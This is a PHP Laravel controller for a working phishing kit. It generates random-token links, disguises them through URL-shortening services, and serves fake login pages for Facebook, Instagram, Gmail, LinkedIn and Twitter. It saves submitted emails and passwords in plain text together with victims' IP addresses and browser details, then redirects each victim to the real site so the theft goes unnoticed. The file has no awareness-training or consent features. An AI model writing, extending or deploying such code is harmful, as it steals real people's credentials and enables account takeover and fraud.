<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\PhishingLink;
use App\Models\PhishingSubmission;
use App\Models\Platform;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Redirect;
use GuzzleHttp\Client;

class PhishingLinkController extends Controller
{
    // Show form for creating phishing link
    public function create()
    {
        $platforms = Platform::all();
        return view('phishing_link_create', compact('platforms'));
    }

    // Store the link and generate a token
    public function store(Request $request)
    {
        $request->validate([
            'platform' => 'required|string',
        ]);

        $token = Str::random(16);
        $link = PhishingLink::create([
            'platform' => $request->platform,
            'token' => $token,
            'redirect_url' => null,
            'created_by' => Auth::id() ?? 1,
        ]);

        // Generate professional-looking link using URL shortening services
        $originalUrl = url("/login/{$token}");
        $professionalLink = $this->shortenUrl($originalUrl);
        
        $link->shortened_url = $professionalLink;
        $link->save();

        return redirect()->route('link.create')
            ->with('success', 'Link generated successfully!')
            ->with('link', $professionalLink);
    }

    // Show fake login page based on token
    public function showForm($token)
    {
        $link = PhishingLink::where('token', $token)->firstOrFail();
        $view = 'fake_login_' . strtolower($link->platform);
        if (!view()->exists($view)) {
            abort(404);
        }
        return view($view, ['token' => $token]);
    }

    // Handle submitted form, store email/password
    public function captureData(Request $request, $token)
    {
        $link = PhishingLink::where('token', $token)->firstOrFail();
        
        PhishingSubmission::create([
            'phishing_link_id' => $link->id,
            'email' => $request->email,
            'password' => $request->password, // Always plain text as requested
            'ip_address' => $request->ip(),
            'user_agent' => $request->header('User-Agent'),
        ]);
        
        // Redirect to real platform
        $redirect = $this->getRealPlatformUrl($link->platform);
        return Redirect::away($redirect);
    }

    private function getRealPlatformUrl($platform)
    {
        $urls = [
            'facebook' => 'https://facebook.com',
            'instagram' => 'https://instagram.com',
            'gmail' => 'https://mail.google.com',
            'linkedin' => 'https://linkedin.com',
            'twitter' => 'https://twitter.com',
        ];
        return $urls[strtolower($platform)] ?? 'https://google.com';
    }

    private function shortenUrl($url)
    {
        $services = [
            'tinyurl' => $this->shortenWithTinyUrl($url),
            'bitly' => $this->shortenWithBitly($url),
            'isgd' => $this->shortenWithIsGd($url),
        ];

        // Try each service until one works
        foreach ($services as $service => $shortened) {
            if ($shortened) {
                return $shortened;
            }
        }

        // Fallback to original URL if all services fail
        return $url;
    }

    private function shortenWithTinyUrl($url)
    {
        try {
            $client = new Client(['timeout' => 10]);
            $response = $client->get('https://tinyurl.com/api-create.php', [
                'query' => ['url' => $url]
            ]);
            $shortened = $response->getBody()->getContents();
            return (filter_var($shortened, FILTER_VALIDATE_URL)) ? $shortened : null;
        } catch (\Exception $e) {
            return null;
        }
    }

    private function shortenWithBitly($url)
    {
        try {
            // You would need a Bitly API key for this
            // For now, return null to try other services
            return null;
        } catch (\Exception $e) {
            return null;
        }
    }

    private function shortenWithIsGd($url)
    {
        try {
            $client = new Client(['timeout' => 10]);
            $response = $client->get('https://is.gd/create.php', [
                'query' => [
                    'format' => 'simple',
                    'url' => $url
                ]
            ]);
            $shortened = $response->getBody()->getContents();
            return (filter_var($shortened, FILTER_VALIDATE_URL)) ? $shortened : null;
        } catch (\Exception $e) {
            return null;
        }
    }
}
